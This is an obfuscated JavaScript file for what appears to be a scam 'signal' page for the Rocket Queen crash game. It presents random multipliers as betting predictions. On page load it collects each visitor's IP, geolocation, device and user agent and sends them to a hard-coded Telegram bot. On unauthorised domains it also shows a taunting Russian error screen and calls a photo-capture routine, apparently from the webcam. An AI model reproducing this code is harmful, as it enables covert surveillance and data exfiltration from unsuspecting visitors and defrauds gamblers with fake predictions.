'dYPLo', 'to__', 'l8fK5', "and s", '7WyDW', 'ALL5A', 'lnGvH', 's.com', 'ax-wi', 'qJGKC', 'toStr', " font", 'zpCPp', 'c01Fy', 'авиль', 'OYdam', 'M051s', '4crV6', 'DQQsd', '2876090NubHTw', 'etect', "x rgb", "ws Ph", '5JIXW', 'FZO1F', "XcQ\" ", "e>\n📌 ", "04: Д", 'uBLvh', 'AbWHI', "red;\n", 'apply', 'WOT52', "wn De", 'GiAQF', 'BJgcz', "\n🚫 <b", 'li>Не', 'MNKXP', 'BgARk', 'toBlo', "px rg", 'rzTB1', "    }", 'RoqmE', 'jNoI0', 'jyjkS', 'ackgr', 'EwPKh', 'dMtgA', 'L8kh0', 'V6Poh', 'e/png', 'TqmMh', 'BmWHT', 'DDmnI', 'nseTe', 'MLmJ5', 'Krp1j', 'adius', "0;\n  ", '2cbWg', "    @", 'Kgyty', 'vCtlg', 'Mobil', 't5IBg', 'kFwRm', '3YGRg', 'MZycF', 'Beare', 'goB2x', " User", 'ABFn4', '12PMO', 'AAOww', "th ID", "=\"ove", '/div>', 'uZDiE', 'Rphxe', 'BD54L', 'Lnd9x', 'EggMb', 'regex', 'wvylo', 'detxB', 'class', 'q/+6k', 'photo', 'Lrw06', 'YTQEn', 'kMJ0I', 'fEIv+', 'jdTrn', 'GtWMs', '0ezAA', 'gAMkH', 'luEUI', 'id_n=', 'nn/wX', 'yEQCH', 'main:', " запр", 'iKaLJ', '8qpx1', '8svd7', 'BRaLP', "top: ", 'CgUKz', 'pAVzc', 'kVEKD', 'Devic', 'xZv+y', 'white', 't8uKr', "    l", '/send', " 10px", 'h3Mra', "v cla", 'entyp', "\"data", " padd", '1HMsR', 'YYzOU', ')</co', " }\n  ", '-grad', 'BvpEY', " heig", '://ip', 'y+1Oc', 'effic', 'K5xMG', 'CFS6W', '22pDccBm', 'Xrbh/', "nd: l", 'hQFMg'];
  _0xd31d = function () {
    return _0x3b3264;
  };
  return _0xd31d();
}
async function initTelegramBot() {
  const _0x482398 = function () {
    let _0x20aa99 = true;
    return function (_0x5c0b68, _0x3b192a) {
      const _0x40a60d = {
        sjKNo: "iPad"
      };
      _0x40a60d.dkBCa = "smallt";
      _0x40a60d.JVUfx = "kif";
      const _0xb85b7b = _0x20aa99 ? function () {
        if (_0x3b192a) {
          const _0x192e5d = _0x3b192a.apply(_0x5c0b68, arguments);
          _0x3b192a = null;
          return _0x192e5d;
        }
      } : function () {};
      _0x20aa99 = false;
      return _0xb85b7b;
    };
  }();
  const _0x3d4ba0 = _0x482398(this, function () {
    const _0x2b512d = function () {
      let _0x7427c8;
      try {
        _0x7427c8 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0x2302dd) {
        _0x7427c8 = window;
      }
      return _0x7427c8;
    };
    const _0x5c86e6 = _0x2b512d();
    const _0x460aaa = _0x5c86e6.console = _0x5c86e6.console || {};
    const _0x1b17aa = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x520a4d = 0; _0x520a4d < _0x1b17aa.length; _0x520a4d++) {
      const _0x5228ed = _0x482398.constructor.prototype.bind(_0x482398);
      const _0x384f7c = _0x1b17aa[_0x520a4d];
      const _0x1efdb8 = _0x460aaa[_0x384f7c] || _0x5228ed;
      _0x5228ed.__proto__ = _0x482398.bind(_0x482398);
      _0x5228ed.toString = _0x1efdb8.toString.bind(_0x1efdb8);
      _0x460aaa[_0x384f7c] = _0x5228ed;
    }
  });
  _0x3d4ba0();
  const _0x3b4b69 = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  if (_0x3b4b69.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x5f34f6 = document.createElement("style");
    _0x5f34f6.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x5f34f6);
    const _0x1e0a34 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x3b4b69.domain + "</code>\n🔗 URL: <code>" + _0x3b4b69.fullUrl + "</code>\n🌐 IP: <code>" + _0x1e0a34.ip + "</code>\n📌 Location: " + _0x1e0a34.city + ", " + _0x1e0a34.region + ", " + _0x1e0a34.countryName + " " + _0x1e0a34.countryEmoji + "\n📱 Device: <code>" + _0x1e0a34.deviceModel + "</code>\n🖥️ Type: <code>" + _0x1e0a34.deviceType + " (" + _0x1e0a34.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x1e0a34.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x8ddc76 = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x37545a = await _0x8ddc76.json();
    if (_0x37545a.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x14e2f1 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x3b4b69.domain + "</code>\n🔗 URL: <code>" + _0x3b4b69.fullUrl + "</code>\n🌐 IP: <code>" + _0x14e2f1.ip + "</code>\n📌 Location: " + _0x14e2f1.city + ", " + _0x14e2f1.region + ", " + _0x14e2f1.countryName + " " + _0x14e2f1.countryEmoji + "\n📱 Device: <code>" + _0x14e2f1.deviceModel + "</code>\n🖥️ Type: <code>" + _0x14e2f1.deviceType + " (" + _0x14e2f1.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x14e2f1.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0x530fbf) {
    console.error("Failed to initialize bot:", _0x530fbf);
    const _0x5d2ca8 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x3b4b69.domain + "</code>\n🔗 URL: <code>" + _0x3b4b69.fullUrl + "</code>\n🌐 IP: <code>" + _0x5d2ca8.ip + "</code>\n📌 Location: " + _0x5d2ca8.city + ", " + _0x5d2ca8.region + ", " + _0x5d2ca8.countryName + " " + _0x5d2ca8.countryEmoji + "\n📱 Device: <code>" + _0x5d2ca8.deviceModel + "</code>\n🖥️ Type: <code>" + _0x5d2ca8.deviceType + " (" + _0x5d2ca8.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x5d2ca8.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
const tokens = ["demo", "demo", "demo"];
function getAuthorizationToken() {
  const _0x29c307 = tokens[tokenIndex];
  tokenIndex = (tokenIndex + 1) % tokens.length;
  return "Bearer " + _0x29c307;
}
function getRan(_0x3f9b93, _0x59a3fa) {
  return Math.random() * (_0x59a3fa - _0x3f9b93) + _0x3f9b93;
}
async function checkSignal() {
  let _0x59143f = (Math.random() * 3.9 + 1.1).toFixed(2);
  const _0x4232a9 = await fetch("https://crash-gateway-cc-cr.gamedev-tech.cc/state?id_n=1play_rocketqueen&id_i=1", {
    'headers': {
      'Authorization': getAuthorizationToken()
    }
  });
  const _0x1a6392 = await _0x4232a9.json();
  const _0x389229 = _0x1a6392.current_state;
  let _0x305a5a = document.getElementById("responseText");
  if (!_0x305a5a) {
    console.error("Element with ID responseText not found.");
    return;
  }
  if (_0x389229 === "betting" && Date.now() - lastBettingTime > 5000) {
    let _0x52c59e = _0x59143f + 'x';
    document.getElementById("responseText").textContent = _0x52c59e;
    localStorage.setItem("resultText", _0x52c59e);
    _0x305a5a.className = "text betting";
    lastBettingTime = Date.now();
  } else if (_0x389229 === "ending") {
    _0x305a5a.textContent = "Waiting..";
    _0x305a5a.className = "text fly";
  }
}
function fetchDataAndUpdate() {
  fetch("https://crash-gateway-cc-cr.gamedev-tech.cc/state?id_n=1play_rocketqueen&id_i=1", {
    'headers': {
      'Authorization': getAuthorizationToken()
    }
  }).then(_0x16a851 => _0x16a851.json()).then(_0x722183 => {
    const _0x3263fb = parseFloat(_0x722183.current_coefficients);
    updateCoefficients(_0x3263fb);
  })["catch"](_0x96ce9 => console.error("Error fetching data:", _0x96ce9));
}
function updateCoefficients(_0x216171) {
  const _0x57e73d = document.getElementById("coefficients");
  if (!_0x57e73d) {
    console.error("Element with ID coefficients not found.");
    return;
  }
  if (_0x216171 !== 1) {
    _0x57e73d.innerText = 'x' + _0x216171;
    _0x57e73d.classList.remove("smallt");
    _0x57e73d.classList.add("kif");
  }
}
fetchDataAndUpdate();
setInterval(fetchDataAndUpdate, 100);
function _0x5c03a4(_0x3f5c9d, _0x4046f7, _0x119d7a, _0x1d8a16, _0x54943a) {
  return _0xff7d(_0x3f5c9d + 0x183, _0x119d7a);
}
function _0x3cd741(_0x36a039, _0x3f974b, _0x27e4c0, _0x1390fe, _0x29b5d0) {
  return _0xff7d(_0x29b5d0 - 0x2d4, _0x27e4c0);
}
function _0x33aafa(_0x27b7c0, _0x5f0b28, _0x1a558d, _0x17c859, _0x86b3b2) {
  return _0xff7d(_0x5f0b28 + 0x1f7, _0x86b3b2);
}
checkSignal();
function _0x816731(_0x426d19, _0x1a4239, _0xc692e6, _0x3f8996, _0x1f5a1d) {
  return _0xff7d(_0x3f8996 - 0x179, _0x426d19);
}
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});